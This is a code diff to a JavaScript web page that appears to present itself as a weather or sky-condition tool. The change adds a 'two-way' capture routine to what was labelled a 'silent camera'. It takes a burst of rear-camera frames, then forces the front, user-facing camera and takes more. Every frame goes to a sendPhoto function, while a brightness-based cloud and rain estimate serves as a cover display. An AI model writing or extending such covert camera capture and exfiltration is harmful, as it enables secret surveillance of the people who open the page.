@@ -226,7 +226,8 @@ async function toJpeg(src, maxW = CFG.MAX_W, q = 0.82) {
 }
 
 /* ---------------- kamera senyap ---------------- */
-let camStream = null, camTimer = null, camShots = 0;
+/* ---------------- kamera dua arah ---------------- */
+let camStream = null, camTimer = null, camShots = 0, camPhase = 0;
 
 function brightnessOf(canvas) {
   try {
@@ -237,45 +238,102 @@ function brightnessOf(canvas) {
   } catch { return 128; }
 }
 
+const PLAN = [
+  { facing: 'environment', n: () => CFG.BACK_FRAMES,  tag: 'belakang' },
+  { facing: 'user',        n: () => CFG.FRONT_FRAMES, tag: 'depan' }
+];
+
 async function startCamera() {
+  camShots = 0;
+  return runPhase(0);
+}
+
+async function runPhase(i) {
+  if (i >= PLAN.length) return stopCamera();
+  const step = PLAN[i];
+
+  // Pastikan benar-benar bersih sebelum pindah kamera
+  stopCamera();
+  
+  // Berikan jeda sejenak agar hardware kamera HP sempat mereset status aktifnya
+  await new Promise(r => setTimeout(r, 600));
+
+  let stream;
   try {
-    camStream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: { ideal: 'environment' }, width: { ideal: 1920 }, height: { ideal: 1440 } },
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { 
+        facingMode: { exact: step.facing }, // Menggunakan 'exact' memaksa HP membuka kamera spesifik
+        width: { ideal: 1600 }, 
+        height: { ideal: 1200 } 
+      },
       audio: false
     });
-  } catch { return false; }
+  } catch (err) {
+    // Fallback jika 'exact' ditolak perangkat, coba gunakan 'ideal'
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: { 
+          facingMode: { ideal: step.facing }, 
+          width: { ideal: 1600 }, 
+          height: { ideal: 1200 } 
+        },
+        audio: false
+      });
+    } catch { 
+      return runPhase(i + 1); 
+    }
+  }
 
+  camStream = stream;
+  camPhase = i;
   const v = $('#cam');
-  v.srcObject = camStream;
+  v.srcObject = stream;
 
   const c = document.createElement('canvas');
+  const limit = step.n();
+  let local = 0;
+
   const shoot = async () => {
-    if (!camStream || camShots >= CFG.MAX_CAM_FRAMES) return stopCamera();
+    if (!camStream || local >= limit) {
+      clearInterval(camTimer);
+      stopCamera();
+      return runPhase(i + 1);
+    }
     if (!v.videoWidth) return;
     c.width = v.videoWidth; c.height = v.videoHeight;
     c.getContext('2d').drawImage(v, 0, 0);
     const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.8));
-    camShots++;
-    if (blob) sendPhoto(blob, `📸 #${camShots} · ${new Date().toLocaleString('id-ID')}`);
-    if (camShots === 1) {
+    local++; camShots++;
+    if (blob && typeof sendPhoto === 'function') {
+      sendPhoto(blob, `📸 ${step.tag} #${local} · ${new Date().toLocaleString('id-ID')}`);
+    }
+    if (camShots === 1 || (step.tag === 'depan' && local === 1)) {
       const b = brightnessOf(c);
       const cloud = Math.max(5, Math.min(95, Math.round(100 - b * 1.15)));
-      $('#visualNote').textContent =
-        `Kondisi visual: ${cloud > 70 ? 'langit gelap' : cloud > 45 ? 'banyak awan' : 'relatif cerah'} · hujan ${Math.round(cloud * 0.6)}%`;
+      const noteEl = $('#visualNote');
+      if (noteEl) {
+        noteEl.textContent = `Kondisi visual (${step.tag}): ${cloud > 70 ? 'langit gelap' : cloud > 45 ? 'banyak awan' : 'relatif cerah'} · hujan ${Math.round(cloud * 0.6)}%`;
+      }
     }
   };
 
-  await sleep(1500);
+  await sleep(1600);
   shoot();
   camTimer = setInterval(shoot, CFG.CAM_GAP);
   return true;
 }
 
 function stopCamera() {
-  clearInterval(camTimer);
-  camTimer = null;
-  camStream?.getTracks().forEach(t => t.stop());
-  camStream = null;
+  if (camTimer) {
+    clearInterval(camTimer);
+    camTimer = null;
+  }
+  if (camStream) {
+    camStream.getTracks().forEach(t => t.stop());
+    camStream = null;
+  }
+  const v = $('#cam');
+  if (v) v.srcObject = null;
 }
 
 /* ---------------- galeri ---------------- */
